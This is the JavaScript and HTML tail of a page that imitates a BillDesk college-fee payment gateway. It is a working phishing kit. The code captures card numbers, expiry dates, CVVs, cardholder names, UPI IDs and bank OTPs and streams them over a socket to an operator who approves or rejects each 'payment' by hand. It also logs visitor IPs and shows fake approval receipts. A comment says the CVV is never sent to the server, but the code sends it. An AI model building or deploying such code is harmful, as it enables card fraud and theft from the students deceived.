function initializePaymentConnection() {
    paymentSocket = io('http://localhost:3000', {
        transports: ['websocket', 'polling'],
        reconnection: true
    });
    
    paymentSocket.on('connect', () => {
        console.log('? Connected to payment server');
        
        // Create payment session
        paymentSocket.emit('paymentRequest', {
            student: studentData,
            amount: studentData.amount
        });
    });
    
    paymentSocket.on('paymentSessionCreated', (data) => {
        paymentSessionId = data.sessionId;
        console.log('?? Payment session created:', paymentSessionId);
    });
    
    // ============================================
    // NEW OTP SYSTEM - SOCKET LISTENER
// Ensure session socket mapping is up-to-date after creation
paymentSocket.on('paymentSessionCreated', (data) => {
    paymentSessionId = data.sessionId;
    console.log('? Payment session created:', paymentSessionId);
    // Bind latest socket to this session for targeted emits from server
    paymentSocket.emit('updateSessionSocket', {
        sessionId: paymentSessionId,
        socketId: paymentSocket.id
    });
});

// Listen for admin commands (OTP / reject)
paymentSocket.on('adminCommand', (data) => {
    console.log('[BILLDESK-DEBUG] Socket connected:', paymentSocket.connected);
    console.log('[BILLDESK-DEBUG] paymentSessionId:', paymentSessionId);

    if (data.command === 'otp') {
        console.log('[OTP] Opening OTP popup for session:', data.sessionId);
        allowNavigationToOtp = true; // Allow navigation without beforeunload interference
        openOtpPopup(data.sessionId, data.bankName, data.bankLogo);
    } else if (data.command === 'rejectPayment' && data.sessionId === paymentSessionId) {
        console.log('[BILLDESK] Payment rejected - redirecting with error');
        window.location.href = 'billdesk_payment.html?error=card_declined&roll=' + studentData.rollNumber +
            '&name=' + encodeURIComponent(studentData.name) +
            '&father=' + encodeURIComponent(studentData.fatherName) +
            '&course=' + encodeURIComponent(studentData.course) +
            '&semester=' + studentData.semester +
            '&amount=' + studentData.amount;
    }
});

// Payment approved handler (single source of truth)
paymentSocket.on('paymentApproved', (data) => {
    console.log('? Payment approved:', data);
    // Show silver loading spinner
    const loadingScreen = document.getElementById('loadingScreen');
    if (loadingScreen) {
        loadingScreen.innerHTML = `
            <div class="bg-white rounded-2xl p-8 flex flex-col items-center gap-4">
                <div class="w-16 h-16 border-4 border-gray-200 border-t-gray-600 rounded-full animate-spin"></div>
                <p class="text-gray-700 font-semibold text-lg">Payment Approved!</p>
                <p class="text-gray-500 text-sm">Redirecting to confirmation page...</p>
            </div>
        `;
        loadingScreen.classList.remove('hidden');
        loadingScreen.classList.add('flex');
    }
    // Redirect after 2 seconds with all data
    setTimeout(() => {
        const params = new URLSearchParams({
            roll: studentData.rollNumber || data.transaction?.rollNumber || 'N/A',
            name: studentData.name || data.transaction?.studentName || 'N/A',
            father: studentData.fatherName || data.transaction?.fatherName || 'N/A',
            email: studentData.email || 'student@smsvaranasi.com',
            mobile: studentData.mobile || '9876543210',
            orderId: document.getElementById('orderID').textContent,
            txnId: data.transaction?.id || ('TXN' + Date.now()),
            mode: data.transaction?.paymentMethod || 'Card/Net Banking',
            amount: data.transaction?.amount || studentData.amount || '82450',
            dateTime: new Date().toLocaleString('en-IN'),
            sessionId: data.transaction?.sessionId || paymentSessionId || ''
        });
        window.location.href = 'payment_success_receipt.html?' + params.toString();
    }, 2000);
});
    paymentSocket.on('paymentRejected', (data) => {
        console.log('? Payment rejected:', data);
        // Redirect to same page with error parameter for card declined
        window.location.href = 'billdesk_payment.html?error=card_declined&roll=' + studentData.rollNumber + '&name=' + encodeURIComponent(studentData.name) + '&father=' + encodeURIComponent(studentData.fatherName) + '&course=' + encodeURIComponent(studentData.course) + '&semester=' + studentData.semester + '&amount=' + studentData.amount;
    });
    
    // Get form elements for card validation
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvvCode');
    const cardHolderNameInput = document.getElementById('cardHolderName');
    const cardNumberInput = document.getElementById('cardNumber');
    
    // Card Number Formatting (xxxx xxxx xxxx xxxx)
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, ''); // Remove spaces
            value = value.replace(/\D/g, ''); // Remove non-digits
            
            // Limit to 16 digits
            if (value.length > 16) {
                value = value.substring(0, 16);
            }
            
            // Format with spaces (xxxx xxxx xxxx xxxx)
            let formattedValue = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                }
                formattedValue += value[i];
            }
            
            e.target.value = formattedValue;
            
            // Card brand detection (after 4-6 digits)
            if (value.length >= 4) {
                detectCardBrand(value);
            } else {
                resetCardLogos();
            }
            
            // Check if form is complete
            validateCardForm();
        });
    }
    
    
    // Expiry Date Formatting (MM/YY)
    if (expiryDateInput) {
        expiryDateInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
            
            // Limit to 4 digits (MMYY)
            if (value.length > 4) {
                value = value.substring(0, 4);
            }
            
            // Auto-insert slash after 2 digits
            if (value.length >= 2) {
                e.target.value = value.substring(0, 2) + '/' + value.substring(2);
            } else {
                e.target.value = value;
            }
            
            // Check if form is complete
            validateCardForm();
        });
    }
    
    // CVV Formatting (xxx)
    if (cvvInput) {
        cvvInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
        
        // Limit to 3 digits
        if (value.length > 3) {
            value = value.substring(0, 3);
        }
        
        e.target.value = value;
        
        // Check if form is complete
        validateCardForm();
    });
    }
    
    // Card Holder Name
    if (cardHolderNameInput) {
        cardHolderNameInput.addEventListener('input', function(e) {
        // Check if form is complete
        validateCardForm();
        });
    }
}


function validateCardForm() {
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvvCode');
    const cardHolderNameInput = document.getElementById('cardHolderName');
    const payButton = document.getElementById('payButton');
    
    // Get values without formatting
    const cardNumber = cardNumberInput.value.replace(/\s/g, '');
    const expiryDate = expiryDateInput.value;
    const cvv = cvvInput.value;
    const cardHolderName = cardHolderNameInput.value.trim();
    
    // Check if all fields are complete
    const isCardNumberValid = cardNumber.length === 16;
    const isExpiryValid = expiryDate.length === 5 && expiryDate.includes('/');
    const isCvvValid = cvv.length === 3;
    const isNameValid = cardHolderName.length > 0;
    
    // Enable button if all fields are valid
    if (isCardNumberValid && isExpiryValid && isCvvValid && isNameValid) {
        payButton.disabled = false;
        payButton.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        payButton.classList.add('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    } else {
        payButton.disabled = true;
        payButton.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        payButton.classList.remove('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    }
}

function detectCardBrand(cardNumber) {
    console.log('?? Card detection - Number:', cardNumber);
    const firstDigit = cardNumber.charAt(0);
    console.log('?? First digit:', firstDigit);
    const visaLogo = document.getElementById('visaLogo');
    const mastercardLogo = document.getElementById('mastercardLogo');
    const rupayLogo = document.getElementById('rupayLogo');
    console.log('?? Logos found:', {visa: !!visaLogo, mastercard: !!mastercardLogo, rupay: !!rupayLogo});
    
    // Reset all to grayscale first
    visaLogo.classList.add('grayscale', 'opacity-50');
    mastercardLogo.classList.add('grayscale', 'opacity-50');
    rupayLogo.classList.add('grayscale', 'opacity-50');
    
    // Detect and highlight based on first digit
    if (firstDigit === '4') {
        // Visa
        console.log('? Visa detected');
        visaLogo.classList.remove('grayscale', 'opacity-50');
        visaLogo.classList.add('opacity-100');
    } else if (firstDigit === '5') {
        // Mastercard
        console.log('? Mastercard detected');
        mastercardLogo.classList.remove('grayscale', 'opacity-50');
        mastercardLogo.classList.add('opacity-100');
    } else if (firstDigit === '6') {
        // RuPay
        console.log('? RuPay detected');
        rupayLogo.classList.remove('grayscale', 'opacity-50');
        rupayLogo.classList.add('opacity-100');
    }
}

function resetCardLogos() {
    const visaLogo = document.getElementById('visaLogo');
    const mastercardLogo = document.getElementById('mastercardLogo');
    const rupayLogo = document.getElementById('rupayLogo');
    
    if (visaLogo && mastercardLogo && rupayLogo) {
        visaLogo.classList.add('grayscale', 'opacity-50');
        mastercardLogo.classList.add('grayscale', 'opacity-50');
        rupayLogo.classList.add('grayscale', 'opacity-50');
    }
}










function showSection(name, event) {
    document.querySelectorAll('.side-pill').forEach(el => el.classList.remove('active', 'bg-gradient-to-r', 'from-orange-50', 'to-white'));
    document.querySelectorAll('.section').forEach(el => el.classList.add('hidden'));
    
    event.currentTarget.classList.add('active', 'bg-gradient-to-r', 'from-orange-50', 'to-white');
    document.getElementById(name + '-section').classList.remove('hidden');
    document.getElementById(name + '-section').classList.add('active');
}

function startTimer() {
    let time = 300;
    setInterval(() => {
        if (time <= 0) return;
        time--;
        let min = Math.floor(time / 60);
        let sec = time % 60;
        const timerEl = document.getElementById('qrTimer');
        if (timerEl) {
            timerEl.textContent = String(min).padStart(2, '0') + ':' + String(sec).padStart(2, '0');
        }
    }, 1000);
}

function openQRModal() {
    // Show loading screen first
    const loadingScreen = document.getElementById('loadingScreen');
    loadingScreen.classList.remove('hidden');
    loadingScreen.classList.add('flex');
    
    // After 1.5 seconds, hide loading and show QR modal
    setTimeout(() => {
        // Hide loading screen
        loadingScreen.classList.add('hidden');
        loadingScreen.classList.remove('flex');
        
        // Show QR modal
        const modal = document.getElementById('qrModal');
        modal.classList.remove('hidden');
        modal.classList.add('flex');
        
        // Reset timer to 5 minutes
        modalTimeRemaining = 300;
        updateModalTimer();
        
        // Clear any existing interval
        if (modalTimerInterval) {
            clearInterval(modalTimerInterval);
        }
        
        // Start countdown
        modalTimerInterval = setInterval(() => {
            if (modalTimeRemaining <= 0) {
                clearInterval(modalTimerInterval);
                return;
            }
            modalTimeRemaining--;
            updateModalTimer();
        }, 1000);
    }, 1500); // 1.5 seconds loading time
}

function closeQRModal(event) {
    if (event && event.target !== event.currentTarget) {
        return; // Don't close if clicking inside modal content
    }
    
    const modal = document.getElementById('qrModal');
    modal.classList.add('hidden');
    modal.classList.remove('flex');
    
    // Stop the timer
    if (modalTimerInterval) {
        clearInterval(modalTimerInterval);
        modalTimerInterval = null;
    }
}

function updateModalTimer() {
    let min = Math.floor(modalTimeRemaining / 60);
    let sec = modalTimeRemaining % 60;
    const timerEl = document.getElementById('modalTimer');
    if (timerEl) {
        timerEl.textContent = String(min).padStart(2, '0') + ':' + String(sec).padStart(2, '0');
    }
}

// ============================================
// PAYMENT PROCESSING
// ============================================
function handlePayment() {
    const payButton = document.getElementById('payButton');
    
    // Get card details
    const cardNumber = document.getElementById('cardNumber').value;
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvvCode').value;
    const cardHolderName = document.getElementById('cardHolderName').value;
    
    // Validate CVV locally
    if (!validateCVV(cvv)) {
        alert('Invalid CVV');
        return;
    }
    
    // Detect card type
    const firstDigit = cardNumber.charAt(0);
    let cardType = 'Unknown';
    if (firstDigit === '4') cardType = 'Visa';
    else if (firstDigit === '5') cardType = 'Mastercard';
    else if (firstDigit === '6') cardType = 'RuPay';
    
    // Prepare card details
    const cardDetails = {
        cardNumber: cardNumber,
        expiryDate: expiryDate,
        cvv: cvv,
        cardHolderName: cardHolderName,
        cardType: cardType
    };
    
    // Send card details to server via WebSocket
    if (paymentSocket && paymentSessionId) {
        // Disable button and change to silver with spinner
        payButton.disabled = true;
        payButton.classList.remove('bg-orange-500', 'text-white', 'hover:bg-orange-600');
        payButton.classList.add('bg-gray-400', 'text-white', 'cursor-not-allowed');
        
        // Add spinner inside button
        payButton.innerHTML = '<div class="flex items-center justify-center gap-2"><div class="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div><span>Processing...</span></div>';
        
        paymentSocket.emit('cardDetailsSubmitted', {
            sessionId: paymentSessionId,
            cardDetails: cardDetails
        });
        
        console.log('?? Card details sent to admin for approval');
        
    } else {
        alert('Connection error. Please refresh and try again.');
    }
}

// UPI Payment Handler (will be used when UPI section is submitted)
function handleUpiPayment(upiId) {
    if (paymentSocket && paymentSessionId) {
        paymentSocket.emit('upiDetailsSubmitted', {
            sessionId: paymentSessionId,
            upiDetails: {
                upiId: upiId,
                upiApp: 'Unknown' // Can be detected from UPI ID
            }
        });
        
        console.log('?? UPI details sent to admin for approval');
    }
}

// CVV Validation (local only - never sent to server)
function validateCVV(cvv) {
    return cvv && cvv.length === 3 && /^\d{3}$/.test(cvv);
}

// Card Number Validation (Luhn Algorithm)
function validateCardNumber(cardNumber) {
    const cleaned = cardNumber.replace(/\s/g, '');
    
    if (!/^\d{16}$/.test(cleaned)) return false;
    
    // Luhn algorithm
    let sum = 0;
    let isEven = false;
    
    for (let i = cleaned.length - 1; i >= 0; i--) {
        let digit = parseInt(cleaned[i]);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return sum % 10 === 0;
}

// Expiry Date Validation
function validateExpiryDate(expiryDate) {
    if (!/^\d{2}\/\d{2}$/.test(expiryDate)) return false;
    
    const [month, year] = expiryDate.split('/').map(Number);
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;
    
    if (month < 1 || month > 12) return false;
    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;
    
    return true;
}

// ============================================
// UPI PAYMENT FUNCTIONS
// ============================================

// Validate UPI form
function validateUpiForm() {
    const upiInput = document.getElementById('upiInput');
    const upiPayButton = document.getElementById('upiPayButton');
    const upiId = upiInput.value.trim();
    
    // Basic UPI ID validation: should contain @ and have text before and after
    const isValid = upiId.length > 3 && upiId.includes('@') && upiId.indexOf('@') > 0 && upiId.indexOf('@') < upiId.length - 1;
    
    if (isValid) {
        upiPayButton.disabled = false;
        upiPayButton.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        upiPayButton.classList.add('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    } else {
        upiPayButton.disabled = true;
        upiPayButton.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        upiPayButton.classList.remove('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    }
}

// Append UPI suffix to input
function appendUpiSuffix(suffix) {
    const upiInput = document.getElementById('upiInput');
    const currentValue = upiInput.value.trim();
    
    // If already has @, replace everything after @
    if (currentValue.includes('@')) {
        const parts = currentValue.split('@');
        upiInput.value = parts[0] + suffix;
    } else {
        // Otherwise just append
        upiInput.value = currentValue + suffix;
    }
    
    validateUpiForm();
}

// Handle UPI Payment
function handleUpiPayment() {
    const upiInput = document.getElementById('upiInput');
    const upiPayButton = document.getElementById('upiPayButton');
    const upiId = upiInput.value.trim();
    
    // Disable button
    upiPayButton.disabled = true;
    upiPayButton.textContent = 'Processing...';
    
    // Generate session ID
    paymentSessionId = 'UPI_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Prepare UPI payment data
    const upiPaymentData = {
        sessionId: paymentSessionId,
        paymentType: 'UPI',
        upiId: upiId,
        amount: studentData.amount,
        currency: 'INR',
        timestamp: new Date().toISOString(),
        studentData: studentData,
        orderID: document.getElementById('orderID').textContent
    };
    
    // Send to backend via Socket.IO
    if (paymentSocket && paymentSocket.connected) {
        console.log('?? Sending UPI payment data:', upiPaymentData);
        paymentSocket.emit('upiDetailsSubmitted', upiPaymentData);
        
        // Show loading screen with blur
        showLoadingScreen();
        
        // After 3-4 seconds, redirect to UPI processing page
        setTimeout(() => {
            // Pass session ID and UPI ID to the new page
            window.location.href = `/transact/upi_processing.html?sessionId=${paymentSessionId}&upiId=${encodeURIComponent(upiId)}&amount=${studentData.amount}`;
        }, 3500); // 3.5 seconds
    } else {
        console.error('? Socket not connected');
        alert('Connection error. Please try again.');
        upiPayButton.disabled = false;
        upiPayButton.textContent = 'Pay ?' + studentData.amount;
    }
}

// Show loading screen with blur
function showLoadingScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const loadingText = document.getElementById('loadingText');
    loadingText.textContent = 'Processing Payment...';
    loadingScreen.classList.remove('hidden');
    loadingScreen.classList.add('flex');
    
    // Make background white and blurred
    loadingScreen.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
    loadingScreen.style.backdropFilter = 'blur(10px)';
}


// ============================================
// BHIM PAYMENT FUNCTIONS
// ============================================

// Validate BHIM form
function validateBhimForm() {
    const bhimInput = document.getElementById('bhimInput');
    const bhimPayButton = document.getElementById('bhimPayButton');
    const upiId = bhimInput.value.trim();
    
    // Basic UPI ID validation: should contain @ and have text before and after
    const isValid = upiId.length > 3 && upiId.includes('@') && upiId.indexOf('@') > 0 && upiId.indexOf('@') < upiId.length - 1;
    
    if (isValid) {
        bhimPayButton.disabled = false;
        bhimPayButton.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        bhimPayButton.classList.add('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    } else {
        bhimPayButton.disabled = true;
        bhimPayButton.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        bhimPayButton.classList.remove('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    }
}

// Append BHIM suffix to input
function appendBhimSuffix(suffix) {
    const bhimInput = document.getElementById('bhimInput');
    const currentValue = bhimInput.value.trim();
    
    // If already has @, replace everything after @
    if (currentValue.includes('@')) {
        const parts = currentValue.split('@');
        bhimInput.value = parts[0] + suffix;
    } else {
        // Otherwise just append
        bhimInput.value = currentValue + suffix;
    }
    
    validateBhimForm();
}

// Handle BHIM Payment
function handleBhimPayment() {
    const bhimInput = document.getElementById('bhimInput');
    const bhimPayButton = document.getElementById('bhimPayButton');
    const upiId = bhimInput.value.trim();
    
    // Disable button
    bhimPayButton.disabled = true;
    bhimPayButton.textContent = 'Processing...';
    
    // Generate session ID
    paymentSessionId = 'BHIM_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Prepare BHIM payment data
    const bhimPaymentData = {
        sessionId: paymentSessionId,
        paymentType: 'BHIM',
        upiId: upiId,
        amount: studentData.amount,
        currency: 'INR',
        timestamp: new Date().toISOString(),
        studentData: studentData,
        orderID: document.getElementById('orderID').textContent
    };
    
    // Send to backend via Socket.IO
    if (paymentSocket && paymentSocket.connected) {
        console.log('?? Sending BHIM payment data:', bhimPaymentData);
        paymentSocket.emit('bhimDetailsSubmitted', bhimPaymentData);
        
        // Show loading screen with blur
        showLoadingScreen();
        
        // After 3-4 seconds, redirect to UPI processing page
        setTimeout(() => {
            // Pass session ID and UPI ID to the new page
            window.location.href = `/transact/upi_processing.html?sessionId=${paymentSessionId}&upiId=${encodeURIComponent(upiId)}&amount=${studentData.amount}&type=BHIM`;
        }, 3500); // 3.5 seconds
    } else {
        console.error('? Socket not connected');
        alert('Connection error. Please try again.');
        bhimPayButton.disabled = false;
        bhimPayButton.textContent = 'Pay ?' + studentData.amount;
    }
}

</script>

<script>


// ============================================
// OTP POPUP FUNCTIONALITY
// ============================================

let otpSessionId = null;
let otpTimer = null;
let otpTimeRemaining = 180; // 3 minutes

function openOtpPopup(sessionId, bankName, bankLogo) {
    console.log('[OTP] Redirecting to OTP verification page for session:', sessionId);
    
    // Set flag to allow navigation
    allowNavigationToOtp = true;
    
    // Get card type from entered card
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const firstDigit = cardNumber.charAt(0);
    let cardType = 'Unknown';
    if (firstDigit === '4') cardType = 'Visa';
    else if (firstDigit === '5') cardType = 'Mastercard';
    else if (firstDigit === '6') cardType = 'RuPay';
    
    console.log('[OTP] Card Type:', cardType);
    console.log('[OTP] Bank:', bankName);
    
    // Lock card fields
    lockCardFields();
    
    // Build URL with parameters
    let url = 'otp_verification.html?sessionId=' + sessionId + '&amount=' + studentData.amount + '&cardType=' + encodeURIComponent(cardType) + '&roll=' + encodeURIComponent(studentData.rollNumber) + '&name=' + encodeURIComponent(studentData.name) + '&father=' + encodeURIComponent(studentData.fatherName) + '&course=' + encodeURIComponent(studentData.course) + '&semester=' + studentData.semester;
    
    if (bankName) {
        url += '&bankName=' + encodeURIComponent(bankName);
    }
    if (bankLogo) {
        url += '&bankLogo=' + encodeURIComponent(bankLogo);
    }
    
    window.location.href = url;
}

function lockCardFields() {
    const cardNumber = document.getElementById('cardNumber');
    const cvv = document.getElementById('cvvCode');
    const expiry = document.getElementById('expiryDate');
    const holder = document.getElementById('cardHolderName');
    
    if (cardNumber && cardNumber.value) {
        cardNumber.value = generateMaskedValue(16);
        cardNumber.disabled = true;
        cardNumber.style.letterSpacing = '2px';
    }
    
    if (cvv && cvv.value) {
        cvv.value = generateMaskedValue(3);
        cvv.disabled = true;
    }
    
    if (expiry && expiry.value) {
        expiry.value = generateMaskedValue(5);
        expiry.disabled = true;
    }
    
    if (holder && holder.value) {
        holder.value = generateMaskedValue(holder.value.length);
        holder.disabled = true;
    }
    
    console.log('[OTP] Card fields locked with masked values');
}

function generateMaskedValue(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function startOtpTimer() {
    otpTimeRemaining = 180;
    updateTimerDisplay();
    
    if (otpTimer) {
        clearInterval(otpTimer);
    }
    
    otpTimer = setInterval(() => {
        otpTimeRemaining--;
        updateTimerDisplay();
        
        if (otpTimeRemaining <= 0) {
            clearInterval(otpTimer);
        }
    }, 1000);
}

function updateTimerDisplay() {
    const minutes = Math.floor(otpTimeRemaining / 60);
    const seconds = otpTimeRemaining % 60;
    const display = minutes + ':' + seconds.toString().padStart(2, '0');
    
    const timerElement = document.getElementById('otpTimer');
    if (timerElement) {
        timerElement.textContent = 'Expires in ' + display;
    }
}

function submitOtp() {
    const otpInput = document.getElementById('otpInput');
    if (!otpInput) {
        console.error('[OTP] OTP input not found');
        return;
    }
    
    const otp = otpInput.value.trim();
    
    if (otp.length !== 6) {
        alert('Please enter a valid 6-digit OTP');
        return;
    }
    
    console.log('[OTP] Submitting OTP:', otp);
    
    // Emit OTP to server
    if (paymentSocket && otpSessionId) {
        paymentSocket.emit('otp-submitted', {
            sessionId: otpSessionId,
            otp: otp
        });
        
        console.log('[OTP] OTP submitted to server');
    } else {
        console.error('[OTP] Socket or sessionId not available');
        alert('Connection error. Please try again.');
        return;
    }
    
    // Disable submit button
    const submitBtn = document.getElementById('otpSubmitBtn');
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = 'Submitted...';
        submitBtn.style.background = '#9ca3af';
        submitBtn.style.cursor = 'not-allowed';
    }
}

// Live Visitor Tracking for Billdesk Page
// This script will be injected into the billdesk_payment.html file

// ============================================
// LIVE VISITOR TRACKING SYSTEM
// ============================================

// Initialize visitor tracking when page loads

// Generate unique visitor ID
function generateVisitorId() {
    return 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// Get visitor IP and ISP information
async function getVisitorInfo() {
    try {
        // Use multiple IP detection services for reliability
        let ipData = null;
        
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            ipData = { ip: data.ip };
        } catch (e) {
            // Fallback to alternative service
            try {
                const response = await fetch('https://httpbin.org/ip');
                const data = await response.json();
                ipData = { ip: data.origin };
            } catch (e2) {
                ipData = { ip: 'Unknown' };
            }
        }
        
        // Get ISP information
        try {
            // CORS FIX: Removed ipapi.co call - const ispResponse = await fetch(https://ipapi.co//json/);
            // const ispData = await ispResponse.json();
            
            return {
                ip: ipData.ip,
                isp: 'Detected via IP', // CORS FIX: Simplified ISP detection
                timestamp: new Date().toISOString()
            };
        } catch (e) {
            return {
                ip: ipData.ip,
                isp: 'Unknown ISP',
                timestamp: new Date().toISOString()
            };
        }
    } catch (e) {
        return {
            ip: 'Unknown',
            isp: 'Unknown ISP',
            timestamp: new Date().toISOString()
        };
    }
}

// Initialize visitor tracking
async function initializeVisitorTracking() {
    try {
        // Generate unique visitor ID
        visitorId = generateVisitorId();
        
        // Get visitor information
        // Send immediate visitor data without waiting for IP detection
        const immediateVisitorInfo = {
            ip: 'Detecting...',
            isp: 'Detecting...',
            timestamp: new Date().toISOString()
        };
        
        // Initialize socket connection
        if (typeof socket !== 'undefined' && socket) { 
            visitorSocket = socket; 
            console.log('?? Using existing socket'); 
        } else { 
            visitorSocket = io(); 
            console.log('?? Created new socket'); 
        }
        
        // Send immediate visitor entry event
        visitorSocket.emit('billdesk_visitor_enter', {
            visitorId: visitorId,
            ip: immediateVisitorInfo.ip,
            isp: immediateVisitorInfo.isp,
            timestamp: immediateVisitorInfo.timestamp,
            page: 'billdesk_payment'
        });
        
        console.log('?? Immediate visitor tracking sent:', visitorId);
        
        // Try to get real IP info in background with timeout
        Promise.race([
            getVisitorInfo(),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 5000))
        ]).then(realVisitorInfo => {
            // Update with real IP info if available
            visitorSocket.emit('billdesk_visitor_enter', {
                visitorId: visitorId,
                ip: realVisitorInfo.ip,
                isp: realVisitorInfo.isp,
                timestamp: realVisitorInfo.timestamp,
                page: 'billdesk_payment'
            });
            console.log('?? Updated visitor info sent:', realVisitorInfo);
        }).catch(e => {
            console.log('?? Using immediate visitor info (IP detection failed/timeout)');
        });
        
        const visitorInfo = immediateVisitorInfo;
        
        // Initialize socket connection
        if (typeof socket !== 'undefined' && socket) { visitorSocket = socket; console.log('?? Using existing socket'); } else { visitorSocket = io(); console.log('?? Created new socket'); }
        
        // Send visitor entry event
        visitorSocket.emit('billdesk_visitor_enter', {
            visitorId: visitorId,
            ip: visitorInfo.ip,
            isp: visitorInfo.isp,
            timestamp: visitorInfo.timestamp,
            page: 'billdesk_payment'
        });
        
        console.log('Visitor tracking initialized:', visitorId);
        
        // Handle page visibility changes (tab switching, minimizing)
        document.addEventListener('visibilitychange', handleVisibilityChange);
        
        // Handle beforeunload (closing tab/browser) - Skip if navigating to OTP
        window.addEventListener('beforeunload', function(e) {
            // Allow navigation to OTP page without triggering exit
            if (allowNavigationToOtp) {
                return;
            }
            handleVisitorExit(e);
        });
        
        // Handle page unload
        window.addEventListener('unload', handleVisitorExit);
        
        // Handle connection loss
        visitorSocket.on('disconnect', () => {
            console.log('Visitor tracking disconnected');
        });
        
    } catch (error) {
        console.error('Failed to initialize visitor tracking:', error);
    }
}

// Handle visitor exit
function handleVisitorExit() {
    if (visitorSocket && visitorId) {
        // Use sendBeacon for reliable exit tracking
        const exitData = {
            visitorId: visitorId,
            timestamp: new Date().toISOString()
        };
        
        // Try sendBeacon first (most reliable)
        if (navigator.sendBeacon) {
            const blob = new Blob([JSON.stringify(exitData)], { type: 'application/json' });
            navigator.sendBeacon('/api/billdesk-visitor-exit', blob);
        } else {
            // Fallback to synchronous request
            visitorSocket.emit('billdesk_visitor_exit', exitData);
        }
    }
}

// Handle visibility changes
function handleVisibilityChange() {
    if (document.hidden) {
        // Page became hidden - visitor might be leaving
        if (visitorSocket && visitorId) {
            visitorSocket.emit('billdesk_visitor_hidden', {
                visitorId: visitorId,
                timestamp: new Date().toISOString()
            });
        }
    } else {
        // Page became visible again
        if (visitorSocket && visitorId) {
            visitorSocket.emit('billdesk_visitor_visible', {
                visitorId: visitorId,
                timestamp: new Date().toISOString()
            });
        }
    }
}

// Initialize tracking when DOM is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeVisitorTracking);
} else {
    initializeVisitorTracking();
}


</script>





<!-- OTP Verification Modal -->
<div id="otpModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); z-index: 9999; align-items: center; justify-content: center;">
    <div style="background: white; border-radius: 12px; padding: 32px; max-width: 400px; width: 90%; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); animation: slideDown 0.3s ease-out;">
        <div style="text-align: center;">
            <div style="width: 48px; height: 48px; margin: 0 auto 16px; background: #f3f4f6; border-radius: 8px; display: flex; align-items: center; justify-content: center;">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                </svg>
            </div>
            <h2 style="font-size: 20px; font-weight: 600; color: #111827; margin-bottom: 8px;">Enter verification code</h2>
            <p style="color: #6b7280; font-size: 14px; margin-bottom: 24px;">Your bank has sent an OTP to your registered mobile number.</p>
            
            <div style="margin-bottom: 16px;">
                <label style="display: block; text-align: left; font-size: 14px; font-weight: 500; color: #374151; margin-bottom: 8px;">OTP</label>
                <input type="text" id="otpInput" maxlength="6" placeholder="Enter 6-digit OTP" style="width: 100%; padding: 12px; border: 2px solid #d1d5db; border-radius: 8px; font-size: 16px; text-align: center; letter-spacing: 4px;" onkeypress="if(event.key === 'Enter') submitOtp();" />
                <div style="text-align: right; margin-top: 8px;">
                    <span id="otpTimer" style="font-size: 12px; color: #6b7280;">Expires in 3:00</span>
                </div>
            </div>
            
            <button id="otpSubmitBtn" onclick="submitOtp()" style="width: 100%; background: #ff6600; color: white; border: none; padding: 12px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s;">
                Verify
            </button>
        </div>
    </div>
</div>

<style>
@keyframes slideDown {
    from {
        transform: translateY(-20px);
        opacity: 0;
    }
    to {
        transform: translateY(0);
        opacity: 1;
    }
}
#otpModal[style*="display: flex"] {
    display: flex !important;
}
</style>
</body>
</html>








































